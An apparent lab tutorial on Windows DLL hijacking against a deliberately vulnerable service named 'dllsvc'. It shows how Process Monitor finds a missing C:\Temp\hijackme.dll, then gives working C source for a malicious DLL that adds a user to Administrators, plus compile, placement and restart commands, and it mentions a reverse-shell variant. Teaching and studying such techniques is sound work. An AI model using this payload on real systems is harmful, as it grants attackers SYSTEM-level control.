# DLL Hijacking

## What is DLL Hijacking?

A **DLL (Dynamic Link Library)** contains code that Windows applications can load and execute.

DLL hijacking occurs when:
```text
Privileged program/service
        ↓
Attempts to load DLL
        ↓
DLL is missing from expected location
        ↓
Windows searches other locations
        ↓
Attacker-controlled writable directory
        ↓
Malicious DLL is found
        ↓
DLL code executes with program/service privileges
```

The key requirement is usually:
```text
Privileged process
        +
DLL search/order weakness
        +
Writable search location
```

---

#  Detection with Process Monitor

For this lab, use **Process Monitor (Procmon)** to observe which DLLs the service tries to load.

`Procmon.exe` is part of **Microsoft Sysinternals**, not built into Windows.

Run it as Administrator.

## Filter by Process Name

In Procmon:
```text
Filter
    ↓
Process Name
    ↓
dllhijackservice.exe
```

Set:
```text
Process Name is dllhijackservice.exe
```

Select:
```text
Include
```

Then click:
```text
Add → Apply → OK
```

This limits the displayed events to the vulnerable service.

#  Filter for Missing DLLs

Add another filter:
```text
Result is NAME NOT FOUND
```

Then:
```text
Add → Apply → OK
```

Now Procmon shows DLL/file lookup attempts that failed.

#  Start the Service

From Windows:
```cmd
sc start dllsvc
```

Look at the Procmon results.

You may see something similar to:
```text
dllhijackservice.exe
    C:\Temp\hijackme.dll
    NAME NOT FOUND
```

This is interesting because:
```text
C:\Temp\hijackme.dll
```
doesn't exist, but the service attempted to load it.

If `C:\Temp` is writable by our low-privileged user, we have a potential DLL hijacking opportunity.

# 4. Confirm the Directory Is Writable

Check:
```cmd
icacls C:\Temp
```

Look for permissions allowing the current user/group to create or modify files.

The important relationship is:
```text
Service wants:
C:\Temp\hijackme.dll

        +

User can write:
C:\Temp

        ↓

Potential DLL hijacking
```

#  Understand the Vulnerability

Suppose the service attempts:
```text
C:\Temp\hijackme.dll
```

but the DLL doesn't exist.

If we can create:
```text
C:\Temp\hijackme.dll
```

the service may load our DLL.

If the service runs as:
```text
NT AUTHORITY\SYSTEM
```

our DLL code can execute in that security context.

The attack chain becomes:
```text
dllsvc
   ↓
Runs as SYSTEM
   ↓
Attempts to load hijackme.dll
   ↓
C:\Temp is writable
   ↓
Place malicious hijackme.dll
   ↓
Restart service
   ↓
Service loads DLL
   ↓
Malicious DLL executes as SYSTEM
```

---

# 6. Create your own DLL

You can write a minimal DLL yourself. For example:
```C
#include <windows.h>

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved
) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
    }

    return TRUE;
}
```


```c
system("cmd.exe /k net localgroup administrators user /add");
```
The important part is that the DLL executes a Windows command when loaded.

Compile it from your machine:
```bash
x86_64-w64-mingw32-gcc hijack.c -shared -o hijackme.dll
```

Explanation:
- `x86_64-w64-mingw32-gcc` → Windows cross-compiler.
- `-shared` → build a DLL/shared library.
- `-o hijackme.dll` → output filename.

Transfer:
```text
hijackme.dll
```

from your machine to the Windows machine.

Then place it exactly where Procmon showed the service trying to find it:
```cmd
copy hijackme.dll C:\Temp\hijackme.dll
```

Verify:
```cmd
dir C:\Temp\hijackme.dll
```

#  Trigger the DLL Hijacking

Restart the service:
```cmd
sc stop dllsvc
sc start dllsvc
```
Or:
```cmd
net stop dllsvc
net start dllsvc
```

When the service starts:
```text
dllsvc
   ↓
Loads hijackme.dll
   ↓
Our DLL code executes
   ↓
cmd.exe /k net localgroup administrators user /add
   ↓
user added to Administrators
```

Verify:
```cmd
net localgroup administrators
```

You should see:
```text
user
```

in the Administrators group.

---

#  Reverse Shell Variant

Instead of modifying the DLL to execute:
```cmd
net localgroup administrators user /add
```

you can make the DLL execute a reverse-shell payload.

The overall idea remains:
```text
Privileged service
       ↓
Loads hijackme.dll
       ↓
Malicious DLL
       ↓
Reverse shell
       ↓
Attacker
```

The critical difference from a normal executable hijack is that we're replacing **a DLL dependency**, not the service executable itself.

---

#  Why Process Monitor Is Useful

Procmon is especially useful because you don't always know:
- which DLL the program needs
- where Windows is looking for it
- whether the DLL exists
- which search location is writable

The `NAME NOT FOUND` filter helps identify failed file/DLL lookups.

Useful events look like:
```text
Process Name:
dllhijackservice.exe

Operation:
CreateFile

Path:
C:\Temp\hijackme.dll

Result:
NAME NOT FOUND
```

This tells us:
> The process attempted to access this file, but it wasn't found.

If the directory is writable, investigate whether placing a DLL there causes the privileged process to load it.

---

#  Important Difference From EXE Hijacking

### Service executable hijacking

You replace the program:
```text
service.exe
```

Example:
```text
Service
  ↓
service.exe
  ↓
Replace service.exe
  ↓
Start service
```

### DLL hijacking

The legitimate program remains:
```text
service.exe
```

but it loads:
```text
hijackme.dll
```

and we provide our own DLL:
```text
service.exe
    ↓
Load DLL
    ↓
C:\Temp\hijackme.dll
    ↓
Malicious DLL
```

So:
> **EXE hijacking replaces the executable. DLL hijacking abuses a DLL dependency/search location.**

---

#  Detection Checklist
```text
1. Identify privileged process/service
        ↓
2. Monitor it with Procmon
        ↓
3. Filter Process Name
        ↓
4. Filter Result = NAME NOT FOUND
        ↓
5. Look for DLL lookup attempts
        ↓
6. Identify the DLL path
        ↓
7. Check whether the directory is writable
        ↓
8. Determine the service/process account
```

#  Attack Chain
```text
Privileged service
        ↓
Service runs as SYSTEM
        ↓
Procmon reveals missing DLL
        ↓
Service searches C:\Temp\hijackme.dll
        ↓
C:\Temp is writable
        ↓
Create malicious hijackme.dll
        ↓
Place DLL in C:\Temp
        ↓
Restart service
        ↓
Service loads malicious DLL
        ↓
DLL code executes as SYSTEM
```

## Key Idea

> **DLL hijacking = a privileged application loads a DLL from a location that an attacker can control.**
